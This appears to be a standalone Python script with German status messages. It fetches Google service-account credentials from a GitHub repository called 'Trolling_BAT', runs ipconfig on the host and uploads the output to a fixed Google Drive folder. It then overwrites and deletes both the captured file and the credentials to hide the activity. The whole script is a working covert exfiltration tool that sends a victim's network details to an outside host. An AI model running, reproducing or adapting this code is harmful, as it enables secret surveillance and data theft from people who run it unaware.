import os
import time
import requests
import subprocess
import sys
import google.auth.transport.requests
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload

CREDENTIALS_URL = "https://raw.githubusercontent.com/MangoTheSherlock/Trolling_BAT/main/credentials.json"
CREDENTIALS_FILE = "credentials.json"

def download_credentials():
    response = requests.get(CREDENTIALS_URL)
    if response.status_code == 200:
        with open(CREDENTIALS_FILE, "wb") as f:
            f.write(response.content)
    else:
        sys.exit(1)

download_credentials()

OUTPUT_FILE = "output.txt"

with open(OUTPUT_FILE, "w") as f:
    process = subprocess.run(["ipconfig"], stdout=f, text=True, shell=True)

f.close()
time.sleep(1)

SCOPES = ["https://www.googleapis.com/auth/drive.file"]
creds = service_account.Credentials.from_service_account_file(CREDENTIALS_FILE, scopes=SCOPES)

request = google.auth.transport.requests.Request()
creds.refresh(request)

service = build("drive", "v3", credentials=creds)

FOLDER_ID = "1zLRe3Kq1x4FDB5khIUTHaHMA9-feiHRf"

file_metadata = {"name": OUTPUT_FILE, "parents": [FOLDER_ID]}
media = MediaFileUpload(OUTPUT_FILE, mimetype="text/plain", resumable=False)

upload_successful = False
max_retries = 5
for attempt in range(max_retries):
    try:
        uploaded_file = service.files().create(body=file_metadata, media_body=media, fields="id").execute()
        upload_successful = True
        print(f"Datei erfolgreich hochgeladen: ID {uploaded_file['id']}")
        break
    except Exception as e:
        print(f"Fehler beim Hochladen (Versuch {attempt+1}/{max_retries}): {e}")
        time.sleep(2 ** attempt)

if not upload_successful:
    sys.exit(1)

time.sleep(2)

def safe_delete(file):
    try:
        if os.path.exists(file):
            os.chmod(file, 0o777)
            with open(file, "w") as f:
                f.close()
            time.sleep(1)
            os.remove(file)
            print(f"{file} wurde erfolgreich gelöscht.")
        else:
            print(f"{file} nicht gefunden.")
    except Exception as e:
        print(f"Fehler beim Löschen von {file}: {e}")

safe_delete(OUTPUT_FILE)
safe_delete(CREDENTIALS_FILE)

sys.exit(0)
